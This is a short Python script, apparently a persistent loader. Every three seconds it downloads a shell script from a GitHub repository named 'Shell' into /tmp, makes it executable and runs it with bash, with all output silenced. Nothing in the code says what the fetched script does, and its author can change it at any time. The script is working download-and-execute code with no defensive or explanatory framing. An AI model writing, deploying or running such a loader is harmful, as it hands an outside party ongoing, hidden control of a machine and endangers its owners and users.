#!/usr/bin/env python3
import os
import time
import subprocess
import signal

URL = "https://github.com/ardifx01/Shell/raw/main/a.sh"
FILE = "/tmp/a.sh"
INTERVAL = 3  # 3 detik

current_process = None

def update_script():
    os.system(f"curl -s {URL} -o {FILE}")
    os.chmod(FILE, 0o755)

def run_script():
    global current_process

    # kalau proses sebelumnya masih hidup, jangan spawn lagi
    if current_process and current_process.poll() is None:
        return

    current_process = subprocess.Popen(
        ["/bin/bash", FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def main():
    while True:
        update_script()
        run_script()
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
